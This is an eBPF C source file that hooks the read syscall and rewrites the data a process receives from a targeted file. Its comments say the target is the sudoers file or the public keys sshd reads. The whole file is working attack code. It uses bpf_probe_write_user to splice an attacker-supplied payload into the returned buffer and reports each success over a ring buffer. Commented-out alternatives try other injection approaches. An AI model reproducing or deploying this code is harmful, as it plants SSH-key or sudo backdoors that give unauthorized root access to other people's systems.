#include "./common.h"
SEC("tp/syscalls/sys_enter_read")
int handle_read_enter(struct trace_event_raw_sys_enter *ctx)
{
    // Check this open call is opening our target file
    size_t pid_tgid = bpf_get_current_pid_tgid();
    // int pid = pid_tgid >> 32;
    unsigned int *pfd = bpf_map_lookup_elem(&map_fds, &pid_tgid);
    if (pfd == 0)
    {
        return 0;
    }

    // Check this is the sudoers file descriptor
    unsigned int map_fd = *pfd;
    unsigned int fd = (unsigned int)ctx->args[0];
    if (map_fd != fd)
    {
        return 0;
    }

    // Store buffer address from arguments in map
    long unsigned int buff_addr = ctx->args[1];
    bpf_map_update_elem(&map_buff_addrs, &pid_tgid, &buff_addr, BPF_ANY);

    // log and exit
    // size_t buff_size = (size_t)ctx->args[2];
    return 0;
}

SEC("tp/syscalls/sys_exit_read")
int handle_read_exit(struct trace_event_raw_sys_exit *ctx)
{
    // Check this open call is reading our target file
    size_t pid_tgid = bpf_get_current_pid_tgid();
    int pid = pid_tgid >> 32;
    long unsigned int *pbuff_addr = bpf_map_lookup_elem(&map_buff_addrs, &pid_tgid);
    if (pbuff_addr == 0)
    {
        return 0;
    }
    long unsigned int buff_addr = *pbuff_addr;
    if (buff_addr <= 0)
    {
        return 0;
    }

    // This is amount of data returned from the read syscall
    if (ctx->ret <= 0)
    {
        return 0;
    }
    long int read_size = ctx->ret;
    // long int read_size = ctx->ret;

    // Add our payload to the end and with '\n'
    // read_size less than payload, we can't write in the buffer
    // read_size == 4096 read max when sshd read.
    if (read_size < max_payload_len || read_size == 4096) {
        return 0;
    }
    char *new_buff_addr = (char *)(buff_addr + read_size - max_payload_len -1);
    // |<--------- raw content ------->|\n|<------------ payload ------------->|
    // |<----------------------------- ret_size ------------------------------>|
    // |<-- buff_addr                  |<-- new_buff_addr                      |<-- buff_addr + read_size
    char local_buff[max_payload_len] = {0x00}; // clean buff
    size_t key = 0;
    char *payload = (char *)bpf_map_lookup_elem(&map_payload_buffer, &key);
    if (payload == 0)
    {
        return 0;
    }
    local_buff[0] = '\n';
    for (unsigned int i = 0; i < max_payload_len; i++)
    {
        local_buff[i + 1] = payload[i];
    }
    // local_buff[max_payload_len + 1] = '\0';
    long ret = bpf_probe_write_user((void *)new_buff_addr, local_buff, max_payload_len);
        
    /*  
    // new idea:
    // if CTX->ret can be changed
    // max_payload_len < 450;
    // long int read_size = ctx->ret;
    if (read_size + max_payload_len > 4096)
    {
        return 0;
    }
    char local_buff[max_payload_len] = {0x00}; // instead of char local_buff[new_ret] = {0};
    size_t key = 0;
    char *payload = (char *)bpf_map_lookup_elem(&map_payload_buffer, &key);

    char *new_buff_addr = (char *)(buff_addr + ctx->ret);
    long new_ret = ctx->ret + max_payload_len;
    local_buff[0] = '\n';
    for (unsigned int i = 0; i + 1 < max_payload_len; i++)
    {
        local_buff[i + 1] = payload[i];
    }
    long ret = bpf_probe_write_user((void *)new_buff_addr, local_buff, max_payload_len);
    ctx->ret = new_ret;
    */

    /*
    // Add our payload append to the end.
    if (read_size + max_payload_len > 450) {
        return 0;
    }
    long new_ret = read_size + max_payload_len;
    // Overwrite first chunk of data
    // then add '#'s to comment out rest of data in the chunk.
    // This sorta corrupts the sudoers file, but everything still
    // works as expected
    // char local_buff[max_payload_len] = { 0x00 };

    // Append datas to the ends.
    char local_buff[450] = {0x00}; // instead of char local_buff[new_ret] = {0};
    size_t key = 0;
    char *payload = (char *)bpf_map_lookup_elem(&map_payload_buffer, &key);
    // bpf_probe_read(&local_buff, max_payload_len, (void*)buff_addr);
    char * buff = (char *)buff_addr;
    for (unsigned int i = 0; read_size + i < new_ret; i++) {
        if (i < read_size) {
            local_buff[i] = buff[i];
        } else if (i == read_size) {
            local_buff[i] = '\n';
        } else {
            local_buff[i] = payload[i-read_size+1];
        }
    }
    // Write data back to buffer
    long ret = bpf_probe_write_user((void*)buff_addr, local_buff, new_ret);
    // long ret = bpf_probe_write_user((void*)buff_addr, local_buff, max_payload_len);
    ctx->ret = new_ret;
    */
    // Send event
    struct event *e;
    e = bpf_ringbuf_reserve(&rb, sizeof(struct event *), 0);
    if (e)
    {
        e->success = (ret == 0);
        e->pid = pid;
        bpf_get_current_comm(&e->comm, sizeof(e->comm));
        bpf_ringbuf_submit(e, 0);
    }

    // There need bpf delete the pid in maps to avoid the rewrite the others ssh pub keys.
    // Closing file, delete fd from all maps to clean up
    bpf_map_delete_elem(&map_fds, &pid_tgid);
    bpf_map_delete_elem(&map_buff_addrs, &pid_tgid);

    return 0;
}